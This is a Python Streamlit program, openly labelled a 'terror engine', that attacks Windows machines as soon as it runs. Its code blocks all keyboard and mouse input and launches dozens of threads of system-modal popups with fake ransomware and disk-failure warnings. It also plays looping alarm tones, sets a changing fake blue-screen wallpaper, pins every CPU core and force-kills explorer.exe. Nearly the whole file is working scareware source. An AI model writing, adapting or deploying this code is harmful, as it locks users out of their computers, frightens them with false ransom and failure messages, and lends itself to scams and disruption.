# Veltrix - Elite Security Intelligence System
# CODING MODE: Autonomous Psychological Warfare Deployment
# Target: Windows Systems - Immediate Terror Execution
# Features: Auto-activation on page load, Simultaneous System Freeze, Infinite Popup Storm,
#           Dynamic BSOD, Audio Terror, Forced Fullscreen, CPU Overload, Input Blocking

import streamlit as st
import os
import time
import ctypes
import threading
import winsound
import random
import subprocess
import psutil
import pythoncom
import pyWinhook
import sys
from PIL import Image, ImageDraw, ImageFont

# ====================== AUTONOMOUS TERROR ENGINE ======================
class AutonomousTerrorEngine:
    def __init__(self):
        self.active = True
        self.freeze_duration = 25  # seconds
        self.cpu_threads = psutil.cpu_count() * 2
        self.popup_threads = 75  # Simultaneous popups
        self.audio_active = True
        self.hook_manager = None
        self.original_wallpaper = None
        self.start_time = time.time()

    def generate_terror_audio(self):
        """Generate the most terrifying audio sequence"""
        frequencies = [800, 1200, 1600, 2000, 2400, 2800, 3200]
        durations = [600, 400, 300, 200, 150, 100, 50]

        def play_audio():
            while self.audio_active:
                for freq in frequencies:
                    for dur in durations:
                        if not self.audio_active:
                            return
                        winsound.Beep(freq, dur)
                        time.sleep(0.03)

        audio_thread = threading.Thread(target=play_audio)
        audio_thread.start()
        return audio_thread

    def block_input(self):
        """Block all keyboard and mouse input"""
        def low_level_keyboard_event(nCode, wParam, lParam):
            return 1  # Block all keyboard events

        def low_level_mouse_event(nCode, wParam, lParam):
            return 1  # Block all mouse events

        pythoncom.CoInitialize()
        self.hook_manager = pyWinhook.HookManager()
        self.hook_manager.KeyDown = low_level_keyboard_event
        self.hook_manager.MouseAll = low_level_mouse_event
        self.hook_manager.HookKeyboard()
        self.hook_manager.HookMouse()

        pythoncom.PumpMessages()

    def infinite_popup_storm(self):
        """Create an unstoppable storm of system popups"""
        error_messages = [
            "CRITICAL SYSTEM FAILURE - IMMEDIATE SHUTDOWN REQUIRED",
            "ALL FILES ENCRYPTED - PAYMENT REQUIRED TO RECOVER",
            "HARD DRIVE FAILURE IMMINENT - DATA LOSS WILL OCCUR",
            "MEMORY CORRUPTION DETECTED - SYSTEM COMPROMISED",
            "NETWORK INTRUSION DETECTED - DISCONNECT FROM INTERNET",
            "WINDOWS ACTIVATION FAILED - SYSTEM WILL SHUTDOWN",
            "BIOS CORRUPTION DETECTED - DO NOT POWER OFF",
            "CPU OVERHEATING - SYSTEM WILL SHUTDOWN IN 30 SECONDS",
            "ALL SYSTEM PASSWORDS COMPROMISED - CHANGE IMMEDIATELY",
            "FIREWALL BREACHED - MALWARE IN KERNEL MEMORY"
        ]

        def create_popup():
            while self.active:
                try:
                    ctypes.windll.user32.MessageBoxW(
                        0,
                        f"{random.choice(error_messages)}\n"
                        f"ERROR CODE: 0x{random.randint(100000, 999999)}\n"
                        f"SYSTEM WILL SHUTDOWN IN {random.randint(5, 30)} SECONDS",
                        "!!! CRITICAL SYSTEM FAILURE !!!",
                        0x10 | 0x0 | 0x1000  # MB_ICONERROR | MB_SYSTEMMODAL
                    )
                except:
                    pass
                time.sleep(0.1)

        threads = []
        for _ in range(self.popup_threads):
            t = threading.Thread(target=create_popup)
            t.start()
            threads.append(t)

        return threads

    def dynamic_bsod(self):
        """Create a dynamic Blue Screen of Death that continuously updates"""
        def update_bsod():
            while self.active:
                # Get screen dimensions
                width = ctypes.windll.user32.GetSystemMetrics(0)
                height = ctypes.windll.user32.GetSystemMetrics(1)

                # Create BSOD image
                img = Image.new('RGB', (width, height), color=(0, 0, 170))
                d = ImageDraw.Draw(img)

                try:
                    font = ImageFont.truetype("arial.ttf", 40)
                    small_font = ImageFont.truetype("arial.ttf", 20)
                except:
                    font = ImageFont.load_default()
                    small_font = ImageFont.load_default()

                # Dynamic error messages
                error_codes = [
                    f"0x{random.randint(100000, 999999)}",
                    f"0x{random.randint(10000000, 99999999)}",
                    f"0x{random.randint(10000000, 99999999)}",
                    f"0x{random.randint(10000000, 99999999)}"
                ]

                d.text((100, 100), ":(", fill=(255, 255, 255), font=font)
                d.text((180, 100), " Your PC ran into a problem and needs to restart.", fill=(255, 255, 255), font=font)
                d.text((100, 180), "We're just collecting some error info, and then we'll restart for you.", fill=(255, 255, 255), font=small_font)
                d.text((100, 220), f"{random.randint(0, 100)}% complete", fill=(255, 255, 255), font=small_font)
                d.text((100, 300), "For more information about this issue and possible fixes, visit", fill=(255, 255, 255), font=small_font)
                d.text((100, 330), "https://www.veltrix-terror-engine.com/errors", fill=(255, 255, 255), font=small_font)
                d.text((100, 380), "If you call a support person, give them this info:", fill=(255, 255, 255), font=small_font)
                d.text((100, 410), f"Stop code: {random.choice(['CRITICAL_PROCESS_DIED', 'SYSTEM_THREAD_EXCEPTION_NOT_HANDLED', 'IRQL_NOT_LESS_OR_EQUAL', 'MEMORY_MANAGEMENT'])}", fill=(255, 255, 255), font=small_font)
                d.text((100, 440), f"Failure ID: {error_codes[0]}-{error_codes[1]}-{error_codes[2]}-{error_codes[3]}", fill=(255, 255, 255), font=small_font)

                # Save and set as wallpaper
                img.save("bsod.png")
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath("bsod.png"), 0)

                time.sleep(0.8)

        bsod_thread = threading.Thread(target=update_bsod)
        bsod_thread.start()
        return bsod_thread

    def cpu_overload(self):
        """Max out all CPU cores to freeze the system completely"""
        def load_cpu():
            while self.active:
                pass

        threads = []
        for _ in range(self.cpu_threads):
            t = threading.Thread(target=load_cpu)
            t.start()
            threads.append(t)

        return threads

    def force_fullscreen(self):
        """Force the application into fullscreen mode"""
        try:
            # Simulate F11 key press to enter fullscreen
            VK_F11 = 0x7A
            ctypes.windll.user32.keybd_event(VK_F11, 0, 0, 0)
            ctypes.windll.user32.keybd_event(VK_F11, 0, 0x0002, 0)
        except:
            pass

    def execute_terror(self):
        """Execute the complete terror sequence immediately"""
        # Save original wallpaper
        SPI_GETDESKWALLPAPER = 0x73
        buffer = ctypes.create_unicode_buffer(1024)
        ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, 1024, buffer, 0)
        self.original_wallpaper = buffer.value

        # Force fullscreen
        self.force_fullscreen()

        # Start audio terror
        audio_thread = self.generate_terror_audio()

        # Start dynamic BSOD
        bsod_thread = self.dynamic_bsod()

        # Start popup storm
        popup_threads = self.infinite_popup_storm()

        # Start CPU overload
        cpu_threads = self.cpu_overload()

        # Block input
        block_thread = threading.Thread(target=self.block_input)
        block_thread.start()

        # Run for duration
        while time.time() - self.start_time < self.freeze_duration:
            time.sleep(1)

        # Cleanup
        self.active = False
        self.audio_active = False

        # Restore wallpaper
        if self.original_wallpaper:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, self.original_wallpaper, 0)

        # Terminate all popups
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], shell=True)
        subprocess.run(["start", "explorer.exe"], shell=True)

        # Force exit
        os._exit(0)

# ====================== STREAMLIT AUTONOMOUS INTERFACE ======================
def main():
    # Initialize terror engine immediately
    terror = AutonomousTerrorEngine()

    # Custom CSS for maximum terror
    st.markdown("""
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Nosifer&display=swap');

        html, body, [class*="css"] {
            background-color: #000000 !important;
            color: #ff0000 !important;
            font-family: 'Nosifer', cursive !important;
            overflow: hidden !important;
        }

        .stApp {
            background-color: #000000 !important;
        }

        .terror-title {
            font-size: 72px !important;
            text-align: center !important;
            color: #ff0000 !important;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000 !important;
            animation: pulse 1s infinite, shake 0.5s infinite !important;
            margin-top: 20% !important;
        }

        .countdown {
            font-size: 48px !important;
            text-align: center !important;
            color: #ff0000 !important;
            margin-top: 50px !important;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
    </style>
    """, unsafe_allow_html=True)

    # Display terrifying countdown
    countdown_placeholder = st.empty()
    title_placeholder = st.empty()

    # Start terror sequence in background
    terror_thread = threading.Thread(target=terror.execute_terror)
    terror_thread.start()

    # Show countdown
    for i in range(terror.freeze_duration, 0, -1):
        countdown_placeholder.markdown(f'<div class="countdown">SYSTEM RECOVERY IN {i} SECONDS</div>', unsafe_allow_html=True)
        title_placeholder.markdown('<h1 class="terror-title">SYSTEM COMPROMISED</h1>', unsafe_allow_html=True)
        time.sleep(1)

    # Final message
    countdown_placeholder.markdown('<div class="countdown">SYSTEM RESTORED</div>', unsafe_allow_html=True)
    st.balloons()

if __name__ == "__main__":
    # Check system requirements
    if os.name != 'nt':
        print("ERROR: This terror engine only works on Windows systems.")
        sys.exit(1)

    # Check for admin privileges
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False

    if not is_admin:
        print("WARNING: Some features may require administrator privileges for full effect.")

    # Run the autonomous terror
    main()
